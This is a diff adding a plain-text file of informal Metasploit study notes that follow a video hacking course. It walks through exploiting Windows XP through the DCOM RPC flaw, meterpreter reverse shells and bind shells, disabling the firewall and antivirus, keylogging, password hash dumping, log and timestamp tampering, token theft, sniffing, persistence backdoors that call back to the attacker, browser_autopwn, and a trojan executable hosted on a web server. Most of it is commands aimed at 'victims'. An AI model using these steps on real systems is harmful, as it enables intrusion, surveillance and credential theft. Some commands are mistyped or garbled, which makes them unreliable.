@@ -1,0 +1,176 @@
+MetaSploit Framework
+
+nmap -v -n 192.168.1.150 to display all open ports and services.
+
+nmap -sV -n 192.168.1.150 to display in addition with Version of services 
+
+For Microsoft XP SP0:
+
+Vulnerability: Microsoft RPC which allows remote code execution..Download dcom file to exploit this vulnerability.
+
+./dcom 5 192.168.1.150
+
+About RPC Vulnerability:  https://technet.microsoft.com/library/security/ms03-026
+
+Download dcom.c  http://downloads.securityfocus.com/vulnerabilities/exploits/dcom.c
+
+An auxilary module for port scanning:
+
+use auxiliary/scanner/portscan/tcp
+
+search dcom to search for all exploits related to dcom vulnerability
+
+You can set Payload to what code to execute after you executed it successfully.
+
+set PAYLOAD windows/shell_bind_tcp    this bind a command shell on tcp port in the victim after the exploit succeeds
+
+PayLoad:   set PAYLOAD windows/adduser   to add user into the exploited machine
+
+
+Using meterpreter....
+For attacking Windows XP we use same vulnerability of netapi but difference is just of payload of meterpreter
+
+set PAYLOAD windows/meterpreter/reverse_tcp
+
+Then set LHOST to set the listening address that is the IP address of hacker machine
+
+Then just exploit....you will get a meterpreter console.... ps to list all processes sysinfo , getpid,getuid
+
+
+
+Check video part 5 for running various meterpreter commands after exploiting the machine to get various infos...
+
+
+
+Priviledge escalation post exloitation method:
+
+getsystem -t _ with optional parameter to escalate your priviledge....
+rev2self to revert back to your original priviledge
+
+You can use vulnerable application like mini-share, msf has exploit for minishare through which you can get into machine and then escalate your priviledge to system/admin
+
+Based on video7
+Detecting Logs and killing monitoring software...
+
+exlpoit the OS using meterpreter
+Disabling firewall...:
+
+execute -f cmd.exe -c -H
+interact 1(channel no)
+
+
+gets command prompt....
+netsh firewall show opmode to show the status of firewall 
+netsh firewall set opmode mode=DISABLE
+Above line disables the firewall....
+
+To kill av...:
+run killav --this line should work but it was not working in bt5 so we will manually kill the process
+
+tasklist to get the list of all running tasks..
+tasklist /SVC to organize tasks by services...
+tasklist/SVC | find /I "avg" to find tasks with avg substring in it
+Even if we kill avg processes there are two processes avgwd and AVGSIDAgent which will restart all the processes back so we need to kill them first....But...
+sc queryex avgwd
+sc queryex AVGIDSAgent
+This will give us info that we cannot kill avg processes as they are non stoppable and non pausable processes.So we have to disable them at startup itself so that they dont even start when the computer boots....
+sc config avgwd start=disabled
+sc config AVGIDSAgent start=disabled
+Now reboot the remote machine so next time AV will be down....:D :D :D
+
+For taking screenshots or anything else you should be associated with appropriate desktop by migrating to the process which has access to the required desktop...
+migrate 123
+
+Keystroke Sniffer...:
+
+keyscan_start
+keyscan_dump
+keyscan_stop
+
+screenshot
+hashdump will give you hash dumps of different user accounts, which you can use to crack their password....
+
+timestomp hacked.txt -z "01/01/2022 11:11:11"
+
+
+
+
+Impersonating Tokens...
+
+load incognito
+list_tokens -u will display the tokens of all users ...
+impersonate_token placeTokenHere
+So by using these tokens you can do work on the system by using other names.....
+steal_token
+drop_token
+ 
+screengrab to take screenshots it will work only if you are in  a process which has access to active desktop Winsta0
+
+sniffer_interfaces to display all the interfaces
+
+sniffer_start 1(no of interface to sniff) 1024
+sniffer_stats 1
+
+sniffer_dump 1 demo.pcap
+
+Based on video 11
+VERY IMPORTANT TO CREATE BACKDOORS AFTER EXPLOITING THE SYSTEM SO THE VICTIM CAN CONNECT BACK TO YOU AFTER EVERY BOOT
+
+
+run persistence -A -L c:\\ -X -i 5 -p 443 -r 10.0.2.2
+
+background the current sessions and get into the new session
+background
+sessions -i 
+sessions -i 5
+
+reboot the system....so that it will connect back to you automatically...
+
+resource 123123123SDA8/R2/4/2G/3/4G/2/G2//23/R2/T2/3/RAR.RB to delte the created file...
+
+And then there is metsvc for another backdoor....check video 11
+
+
+Based on video 12:
+
+If you have exploited a system, then on meterpreter session: 
+run arp_scanner will give you the mac address of all clients connected to the exploited server or machine..
+
+This video is to exploit a machine or server which is connected to the already exploited machine by pivoting method..
+
+
+Based on video 13:
+For port forwarding,...to connect to the machine which is connected to the exploited machine...
+
+Based on video 14:
+Client Side exploits:
+use auxilary/server/browser_autopwn
+
+show options
+set LMOST 192.168.1.10(ip address of attacker)
+set SRVPORT 80
+set URIPATH /
+run
+Let victim connect back to you at that ip address
+Then meterpreter session is created and so you can access the system....
+
+
+
+Based on video 15:
+
+To start a server:
+apache2ctl start
+mkdir /var/www/trojans
+
+msfpayload windows/meterpreter/reverse_tcp LHOST =192.168.1.10(ip address of attacker) reverse_tcp
+cp reverse_tcp /var/www/trojans
+use exploit windows/multi/handler
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST 192.168.1.10
+
+Let that executable file get into the victim machine and execute it, then it will provide backdoor access and meterpreter session will be opened...
+
+And one part to use msfencode to create  a backdoor...
+
+
+
